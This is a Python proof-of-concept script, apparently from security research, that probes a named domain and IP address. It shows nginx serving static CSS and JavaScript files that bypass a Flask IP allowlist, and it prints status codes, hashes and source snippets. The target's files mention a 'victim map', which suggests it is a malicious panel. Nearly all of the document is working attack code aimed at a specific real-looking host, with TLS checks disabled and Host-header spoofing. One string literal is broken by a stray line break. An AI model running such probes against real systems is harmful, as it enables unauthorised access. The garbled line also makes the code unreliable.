#!/usr/bin/env python3
"""
POC-05: nginx Static File Exposure Bypassing Flask Auth
=======================================================
Target:  https://thisisafalsepositive.st  (185.178.208.191)
Vuln:    nginx serves /static/* directly without routing through Flask,
         bypassing the Flask IP allowlist that protects /auth/login and
         /dashboard/*. All panel CSS and JavaScript source files are
         readable by any IP without authentication.
Impact:  Full disclosure of panel UI structure, route map, feature set,
         JavaScript source code, and design system. Enables reconstruction
         of the admin panel without ever logging in.
Author:  Security Research — 2026-07-20
"""
import urllib.request, urllib.error, ssl, hashlib, sys

TARGET_IP = "185.178.208.191"
HOST       = "thisisafalsepositive.st"
UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

STATIC_FILES = [
    ("/auth/login",            "Flask route (IP protected — expect 403)"),
    ("/dashboard/",            "Flask route (IP protected — expect 302->403)"),
    ("/static/css/style.css",  "nginx served — panel design system"),
    ("/static/css/auth.css",   "nginx served — login page styles"),
    ("/static/css/dashboard.css", "nginx served — victim map + connections table"),
    ("/static/js/app.js",      "nginx served — full panel JavaScript source"),
]

print("=== nginx STATIC FILE BYPASS DEMONSTRATION ===")
print()
for path, description in STATIC_FILES:
    req = urllib.request.Request(
        f"https://{TARGET_IP}{path}",
        headers={"Host": HOST, "User-Agent": UA}
    )
    try:
        r = urllib.request.urlopen(req, timeout=10, context=ctx)
        code = r.status
        data = r.read()
        sha = hashlib.sha256(data).hexdigest()[:16]
        print(f"  HTTP {code} [{len(data):>7,}B] {path}")
        print(f"    -> {description}")
        print(f"    -> SHA256: {sha}...")
        if path.endswith(".js"):
            snippet = data.decode(errors="replace")[:100].replace("
"," ")
            print(f"    -> Content: {snippet}")
    except urllib.error.HTTPError as e:
        print(f"  HTTP {e.code} [       -] {path}")
        print(f"    -> {description}")
    print()

print("[+] POC-05 complete.")
print("[+] All /static/* files are accessible without authentication")
print("[+] Flask protected routes return 403/302 as expected")
print("[+] nginx is serving /static/ directly, bypassing Flask entirely")
